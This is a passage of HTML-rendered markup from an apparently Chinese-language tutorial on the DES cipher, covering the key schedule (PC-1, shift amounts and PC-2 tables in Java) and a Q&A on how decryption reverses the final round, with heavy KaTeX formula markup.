class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.891661em;vertical-align:-0.208331em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.301108em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.208331em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.301108em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.208331em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span></span></span></span></p>\n<h3 id=\"密钥调度算法\"><a class=\"markdownIt-Anchor\" href=\"#密钥调度算法\">#</a> 密钥调度算法</h3>\n<p>现在，整个算法中我们还缺轮密钥的生成过程。首先，我们先看一下密钥调度算法的整体流程。</p>\n<img data-src=\"/DES/key-schedule.png\" class=\"\">\n<ol>\n<li>\n<p>初始 64 位密钥 KEY 先经过置换选择（PERMUTED CHOICE 1，PC-1）得到 56 位的输出。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] PC1 = &#123;</span><br><span class=\"line\">\t\t<span class=\"number\">57</span>, <span class=\"number\">49</span>, <span class=\"number\">41</span>, <span class=\"number\">33</span>, <span class=\"number\">25</span>, <span class=\"number\">17</span>,  <span class=\"number\">9</span>,</span><br><span class=\"line\">\t\t <span class=\"number\">1</span>, <span class=\"number\">58</span>, <span class=\"number\">50</span>, <span class=\"number\">42</span>, <span class=\"number\">34</span>, <span class=\"number\">26</span>, <span class=\"number\">18</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">10</span>,  <span class=\"number\">2</span>, <span class=\"number\">59</span>, <span class=\"number\">51</span>, <span class=\"number\">43</span>, <span class=\"number\">35</span>, <span class=\"number\">27</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">19</span>, <span class=\"number\">11</span>,  <span class=\"number\">3</span>, <span class=\"number\">60</span>, <span class=\"number\">52</span>, <span class=\"number\">44</span>, <span class=\"number\">36</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">63</span>, <span class=\"number\">55</span>, <span class=\"number\">47</span>, <span class=\"number\">39</span>, <span class=\"number\">31</span>, <span class=\"number\">23</span>, <span class=\"number\">15</span>,</span><br><span class=\"line\">\t\t <span class=\"number\">7</span>, <span class=\"number\">62</span>, <span class=\"number\">54</span>, <span class=\"number\">46</span>, <span class=\"number\">38</span>, <span class=\"number\">30</span>, <span class=\"number\">22</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">14</span>,  <span class=\"number\">6</span>, <span class=\"number\">61</span>, <span class=\"number\">53</span>, <span class=\"number\">45</span>, <span class=\"number\">37</span>, <span class=\"number\">29</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">21</span>, <span class=\"number\">13</span>,  <span class=\"number\">5</span>, <span class=\"number\">28</span>, <span class=\"number\">20</span>, <span class=\"number\">12</span>,  <span class=\"number\">4</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li 0=\"\">\n<p>输出分为左右两个 28 位的块<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>C</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">C_{0}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和D_</p>\n</li>\n<li>\n<p 1=\"\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>C</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">C_{0}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>D</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">D_{0}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 经过循环左移特定位数后，得到<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">C_{1}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和D_</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] SHIFTS = &#123;<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">C_{1}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>D</mi><mn>1</mn></msub></mrow><annotation encoding=\"application/x-tex\">D_{1}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">D</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 再经过置换选择（PERMUTED CHOICE 2，PC-2）得到 48 位输出</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span>[] PC2 = &#123;</span><br><span class=\"line\">\t\t<span class=\"number\">14</span>, <span class=\"number\">17</span>, <span class=\"number\">11</span>, <span class=\"number\">24</span>,  <span class=\"number\">1</span>,  <span class=\"number\">5</span>,</span><br><span class=\"line\">\t\t <span class=\"number\">3</span>, <span class=\"number\">28</span>, <span class=\"number\">15</span>,  <span class=\"number\">6</span>, <span class=\"number\">21</span>, <span class=\"number\">10</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">23</span>, <span class=\"number\">19</span>, <span class=\"number\">12</span>,  <span class=\"number\">4</span>, <span class=\"number\">26</span>,  <span class=\"number\">8</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">16</span>,  <span class=\"number\">7</span>, <span class=\"number\">27</span>, <span class=\"number\">20</span>, <span class=\"number\">13</span>,  <span class=\"number\">2</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">41</span>, <span class=\"number\">52</span>, <span class=\"number\">31</span>, <span class=\"number\">37</span>, <span class=\"number\">47</span>, <span class=\"number\">55</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">30</span>, <span class=\"number\">40</span>, <span class=\"number\">51</span>, <span class=\"number\">45</span>, <span class=\"number\">33</span>, <span class=\"number\">48</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">44</span>, <span class=\"number\">49</span>, <span class=\"number\">39</span>, <span class=\"number\">56</span>, <span class=\"number\">34</span>, <span class=\"number\">53</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">46</span>, <span class=\"number\">42</span>, <span class=\"number\">50</span>, <span class=\"number\">36</span>, <span class=\"number\">29</span>, <span class=\"number\">32</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>循环 16 轮，得到 16 个轮密钥。</p>\n</li>\n</ol>\n<p>至此我们就完成了完整的 DES 加密。</p>\n<h3 id=\"des解密浅析\"><a class=\"markdownIt-Anchor\" href=\"#des解密浅析\">#</a> DES 解密浅析</h3>\n<p>分析加密过程的最后一轮，如下图所示。</p>\n<img data-src=\"/DES/lastround.png\" class=\"\">\n<p><strong>Q: 当我们得到输出 R’L’，我们如何还原回<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>R</mi><mn>16</mn></msub><msub><mi>L</mi><mn>16</mn></msub></mrow><annotation encoding=\"application/x-tex\">R_{16}L_{16}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>?</strong></p>\n<p>A：是做<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi><msup><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding=\"application/x-tex\">PC^{-1}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">−</span><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span></span> 的逆变换，也就是做<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>P</mi><mi>C</mi></mrow><annotation encoding=\"application/x-tex\">PC</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">P</span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">C</span></span></span></span>。所以解密第一步和加密完全相同。</p>\n<p><strong>Q: 得到<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>R</mi><mn>16</mn></msub><msub><mi>L</mi><mn>16</mn></msub></mrow><annotation encoding=\"application/x-tex\">R_{16}L_{16}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 后，我们如何还原得到<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>R</mi><mn>15</mn></msub><msub><mi>L</mi><mn>15</mn></msub></mrow><annotation encoding=\"application/x-tex\">R_{15}L_{15}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 呢？</strong></p>\n<p>A: <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>R</mi><mn>15</mn></msub><mo>=</mo><msub><mi>L</mi><mn>16</mn></msub></mrow><annotation encoding=\"application/x-tex\">R_{15} = L_{16}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>， 所以目前只需要知道<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mn>15</mn></msub></mrow><annotation encoding=\"application/x-tex\">L_{15}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 即可。由前面介绍的异或自反性，我们可知</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>L</mi><mn>15</mn></msub><mo>=</mo><msub><mi>L</mi><mn>15</mn></msub><mo>⊕</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>R</mi><mn>15</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>16</mn></msub><mo stretchy=\"false\">)</mo><mo>⊕</mo><mi>f</mi><mo stretchy=\"false\">(</mo><msub><mi>R</mi><mn>15</mn></msub><mo separator=\"true\">,</mo><msub><mi>K</mi><mn>16</mn></msub><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">L_{15} = L_{15} \\oplus f(R_{15}, K_{16}) \\oplus f(R_{15}, K_{16})</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">L</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⊕</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.00773em;\">R</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">6</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span 